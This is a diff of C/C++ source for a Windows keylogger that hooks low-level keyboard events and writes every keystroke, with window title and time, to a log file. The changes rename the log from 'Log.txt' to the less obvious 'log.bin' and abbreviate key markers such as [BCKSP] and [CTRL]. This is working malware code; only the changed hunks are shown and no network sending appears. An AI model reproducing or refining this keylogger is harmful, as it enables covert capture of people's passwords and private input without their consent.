@@ -32,7 +32,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
 			// save to file
-			Save(kbdStruct.vkCode, "Log.txt");
+			Save(kbdStruct.vkCode, "log.bin");
 		}
 	}
 
@@ -102,7 +102,7 @@ int Save(int key_stroke, char *file)
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
+            fprintf(OUTPUT_FILE, "\n\n[W: %s - %s] :", window_title, s);
         }
     }
 
@@ -110,7 +110,7 @@ int Save(int key_stroke, char *file)
 	std::cout << key_stroke << '\n';
 
 	if (key_stroke == VK_BACK)
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+		fprintf(OUTPUT_FILE, "%s", "[BCKSP]");
 	else if (key_stroke == VK_RETURN)
 		fprintf(OUTPUT_FILE, "%s", "\n");
 	else if (key_stroke == VK_SPACE)
@@ -120,9 +120,9 @@ int Save(int key_stroke, char *file)
 	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
 		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
 	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+		fprintf(OUTPUT_FILE, "%s", "[CTRL]");
 	else if (key_stroke == VK_ESCAPE)
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		fprintf(OUTPUT_FILE, "%s", "[ESC]");
 	else if (key_stroke == VK_END)
 		fprintf(OUTPUT_FILE, "%s", "[END]");
 	else if (key_stroke == VK_HOME)
@@ -135,12 +135,14 @@ int Save(int key_stroke, char *file)
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
 	else if (key_stroke == VK_DOWN)
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+    else if (key_stroke == 186)
+		fprintf(OUTPUT_FILE, "%s", "(c)");
 	else if (key_stroke == 190 || key_stroke == 110)
 		fprintf(OUTPUT_FILE, "%s", ".");
 	else if (key_stroke == 189 || key_stroke == 109)
 		fprintf(OUTPUT_FILE, "%s", "-");
 	else if (key_stroke == 20)
-		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+		fprintf(OUTPUT_FILE, "%s", "[CPLCK]");
 	else {
 		if (key_stroke >= 96 && key_stroke <= 105)
 		{
